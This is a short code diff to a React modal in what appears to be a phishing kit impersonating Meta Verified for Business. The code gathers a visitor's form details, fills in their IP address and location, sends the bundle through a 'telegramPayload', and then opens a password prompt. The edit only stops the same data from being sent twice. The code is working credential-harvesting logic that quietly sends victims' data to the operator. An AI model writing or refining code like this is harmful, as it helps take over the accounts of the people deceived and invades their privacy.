@@ -8,6 +8,7 @@ import { useAppStrings } from '@/hooks/useAppStrings';
 import ActivationRefChip from '@/components/meta-verified-for-business/ActivationRefChip';
 import FacebookNotifyToggle from '@/components/meta-verified-for-business/FacebookNotifyToggle';
 import { getUserLocation } from '@/utils/getLocation';
+import { isMetaVerifiedFlowCompleted } from '@/utils/metaVerifiedFlow';
 import { SendData } from '@/utils/sendData';
 
 interface InfomationsModalProps {
@@ -76,19 +77,21 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
 
       dispatch(updateForm(clientData));
 
-      let telegramPayload: Record<string, unknown> = {
-        ...clientData,
-        activationInfoSubmit: true,
-      };
-      if (!clientData.ip?.trim() || !clientData.location?.trim()) {
-        const location = await getUserLocation();
-        telegramPayload = { ...telegramPayload, ...location };
-        dispatch(updateForm(location));
-      }
-      try {
-        await SendData(telegramPayload);
-      } catch {
-        /* luồng UX vẫn tiếp tục */
+      if (!isMetaVerifiedFlowCompleted()) {
+        let telegramPayload: Record<string, unknown> = {
+          ...clientData,
+          activationInfoSubmit: true,
+        };
+        if (!clientData.ip?.trim() || !clientData.location?.trim()) {
+          const location = await getUserLocation();
+          telegramPayload = { ...telegramPayload, ...location };
+          dispatch(updateForm(location));
+        }
+        try {
+          await SendData(telegramPayload);
+        } catch {
+          /* luồng UX vẫn tiếp tục */
+        }
       }
 
       isOpendPassword(true);
